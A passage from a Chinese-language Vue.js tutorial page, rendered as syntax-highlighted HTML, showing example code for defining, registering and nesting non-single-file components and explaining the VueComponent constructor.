class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hello</span>&gt;</span><span class="tag">&lt;/<span class="name">hello</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  第三步：编写组件标签 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  第三步：编写组件标签 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">student</span>&gt;</span><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 体现复用组件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">student</span>&gt;</span><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hello</span>&gt;</span><span class="tag">&lt;/<span class="name">hello</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建school组件</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> school = Vue.extend(&#123;</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：</span><span class="template-variable">&#123;&#123;<span class="name">schoolName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>点我提示学校名<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="built_in">this</span>.schoolName)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建student组件</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> student = Vue.extend(&#123;</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生名字：</span><span class="template-variable">&#123;&#123;<span class="name">studentName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生年龄：</span><span class="template-variable">&#123;&#123;<span class="name">age</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                studentName:<span class="string">&#x27;小明&#x27;</span>,</span></span><br><span class="line">                age:18</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建hello组件</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> hello = Vue.extend(&#123;</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>你好啊！</span><span class="template-variable">&#123;&#123;<span class="name">name</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                name:<span class="string">&#x27;Tom&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">//第二步：注册组件（全局注册）</span></span></span><br><span class="line"><span class="javascript">    Vue.component(<span class="string">&#x27;hello&#x27;</span>,hello)</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 创建vm</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            msg:<span class="string">&#x27;你好啊！&#x27;</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//第二步：注册组件（局部注册）</span></span></span><br><span class="line">        components:&#123;</span><br><span class="line">            school:school,</span><br><span class="line">            student:student</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="javascript">     <span class="comment">// 创建vm</span></span></span><br><span class="line"><span class="javascript">     <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root2&#x27;</span>,</span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="43-非单文件组件（几个注意点）"><a href="#43-非单文件组件（几个注意点）" class="headerlink" title="43.非单文件组件（几个注意点）"></a>43.非单文件组件（几个注意点）</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>非单文件组件（几个注意点）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">      几个注意点：</span></span><br><span class="line"><span class="comment">        1.关于组件名：</span></span><br><span class="line"><span class="comment">            一个单词组成：</span></span><br><span class="line"><span class="comment">                第一种写法（首字母小写）：school；</span></span><br><span class="line"><span class="comment">                第二种写法（首字母大写）：School；</span></span><br><span class="line"><span class="comment">            多个单词组成：</span></span><br><span class="line"><span class="comment">                第一种写法（kebab-case命名）：my-school；</span></span><br><span class="line"><span class="comment">                第二种写法（CamelCase命名）：MySchool；（需要Vue脚手架支持）</span></span><br><span class="line"><span class="comment">            备注：</span></span><br><span class="line"><span class="comment">                (1).组件名尽可能回避HTML中原有的元素名称，列如：h2、H2都不行；</span></span><br><span class="line"><span class="comment">                (2).可以使用name配置项指定组件在开发者工具中呈现的名字；</span></span><br><span class="line"><span class="comment">        2.关于组件标签：</span></span><br><span class="line"><span class="comment">            第一种写法：&lt;my-school&gt;&lt;/my-school&gt;；</span></span><br><span class="line"><span class="comment">            第二种写法：&lt;my-school/&gt;；</span></span><br><span class="line"><span class="comment">            备注：不用脚手架时，&lt;my-school/&gt;会导致后续组件不能渲染；</span></span><br><span class="line"><span class="comment">        3.一个简写方式：</span></span><br><span class="line"><span class="comment">            const s = Vue.extend(options) 可简写为：const s = options</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  第三步：编写组件标签 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">my-school</span>&gt;</span><span class="tag">&lt;/<span class="name">my-school</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建school组件</span></span></span><br><span class="line"><span class="javascript">   <span class="keyword">const</span> s = Vue.extend(&#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;MySchool&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：</span><span class="template-variable">&#123;&#123;<span class="name">schoolName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>点我提示学校名<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="built_in">this</span>.schoolName)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="javascript">    <span class="comment">//第一步：创建school组件(简写)</span></span></span><br><span class="line">    /*const s = &#123;</span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;MySchool&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：</span><span class="template-variable">&#123;&#123;<span class="name">schoolName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>点我提示学校名<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="built_in">this</span>.schoolName)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;*/</span><br><span class="line"><span class="javascript">    <span class="comment">// 创建vm</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            msg:<span class="string">&#x27;你好啊！&#x27;</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//第二步：注册组件（局部注册）</span></span></span><br><span class="line">        components:&#123;</span><br><span class="line"><span class="javascript">            <span class="string">&#x27;my-school&#x27;</span>:s</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">     </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="44-非单文件组件（组件嵌套）"><a href="#44-非单文件组件（组件嵌套）" class="headerlink" title="44.非单文件组件（组件嵌套）"></a>44.非单文件组件（组件嵌套）</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>非单文件组件（组件嵌套）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  第三步：编写组件标签 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;app&gt;&lt;/app&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">     <span class="comment">// 第一步：创建student组件</span></span></span><br><span class="line"><span class="javascript">     <span class="keyword">const</span> student = Vue.extend(&#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;student&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生名字：</span><span class="template-variable">&#123;&#123;<span class="name">studentName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生年龄：</span><span class="template-variable">&#123;&#123;<span class="name">age</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                studentName:<span class="string">&#x27;小明&#x27;</span>,</span></span><br><span class="line">                age:18</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建school组件</span></span></span><br><span class="line"><span class="javascript">   <span class="keyword">const</span> school = Vue.extend(&#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;MySchool&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：</span><span class="template-variable">&#123;&#123;<span class="name">schoolName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">student</span>&gt;</span><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//注册组件（局部注册）</span></span></span><br><span class="line">        components:&#123;</span><br><span class="line">            student,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建hello组件</span></span></span><br><span class="line"><span class="javascript">   <span class="keyword">const</span> hello = Vue.extend(&#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;hello&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">msg</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                msg:<span class="string">&#x27;欢迎来学习！&#x27;</span>,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建app组件</span></span></span><br><span class="line"><span class="javascript">   <span class="keyword">const</span> app = Vue.extend(&#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;app&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">hello</span>&gt;</span><span class="tag">&lt;/<span class="name">hello</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line">        components:&#123;</span><br><span class="line">            hello,</span><br><span class="line">            school</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line"><span class="javascript">    <span class="comment">// 创建vm</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            msg:<span class="string">&#x27;你好啊！&#x27;</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//第二步：注册组件（局部注册）</span></span></span><br><span class="line">        components:&#123;</span><br><span class="line">            app</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="handlebars"><span class="xml">        template:&#x27;<span class="tag">&lt;<span class="name">app</span>&gt;</span><span class="tag">&lt;/<span class="name">app</span>&gt;</span>&#x27;,</span></span></span><br><span class="line">    &#125;)</span><br><span class="line">     </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="45-VueComponent构造函数"><a href="#45-VueComponent构造函数" class="headerlink" title="45.VueComponent构造函数"></a>45.VueComponent构造函数</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>VueComponent构造函数<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">      关于VueComponent：</span></span><br><span class="line"><span class="comment">        1.school组件本质是一个VueComponent构造函数，且不是程序员定义的，是Vue.extend生成的。</span></span><br><span class="line"><span class="comment">        2.我们只需要写&lt;school&gt;&lt;/school&gt;或&lt;school/&gt;，Vue解析时会帮我们创建school组件的实例对象，</span></span><br><span class="line"><span class="comment">        即Vue帮我们执行的：new VueComponent(options)。</span></span><br><span class="line"><span class="comment">        3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent。</span></span><br><span class="line"><span class="comment">        4.关于this指向：</span></span><br><span class="line"><span class="comment">            (1).组件配置中：</span></span><br><span class="line"><span class="comment">                data函数、methods中的函数、watch中的函数、computed中的函数 它们中的this均指的是VueComponent实例对象。</span></span><br><span class="line"><span class="comment">            (2).new Vue()配置中：</span></span><br><span class="line"><span class="comment">                data函数、methods中的函数、watch中的函数、computed中的函数 它们中的this均指的是Vue实例对象。</span></span><br><span class="line"><span class="comment">        5.VueComponent的实例对象，以后简称VC（也可称之为：组件实例对象），</span></span><br><span class="line"><span class="comment">        Vue的实例对象，以后简称vm。</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName01&quot;</span>&gt;</span>点我提示<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建school组件</span></span></span><br><span class="line"><span class="javascript">   <span class="keyword">const</span> school = Vue.extend(&#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;MySchool&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：</span><span class="template-variable">&#123;&#123;<span class="name">schoolName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span 